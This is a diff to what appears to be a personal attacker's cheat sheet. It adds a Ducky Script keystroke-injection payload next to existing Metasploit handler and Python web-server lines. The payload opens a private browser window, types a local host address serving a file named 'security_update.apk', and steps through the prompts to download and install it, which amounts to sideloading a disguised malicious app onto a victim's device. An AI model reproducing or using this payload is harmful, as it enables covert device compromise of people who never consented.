@@ -14,3 +14,50 @@ msf exploit(handler) > exploit -j
 
 ## Python Shitfuckery
 `python -m http.server 8787`
+
+## Some Shit
+```
+TAB
+DELAY 250
+GUI b
+DELAY 800
+CTRL SHIFT n
+DELAY 500
+CTRL l
+DELAY 1000
+STRING 192.168.4.4:9002/security_update.apk
+ENTER
+DELAY 7000
+TAB
+TAB
+DOWN
+RIGHT
+ENTER
+DELAY 1000
+TAB
+ENTER
+TAB
+TAB
+RIGHT
+ENTER
+TAB
+ENTER
+TAB
+ENTER
+DELAY 2000
+TAB
+ENTER
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+DELAY 350
+TAB
+ENTER
+DELAY 350
+ENTER
+```
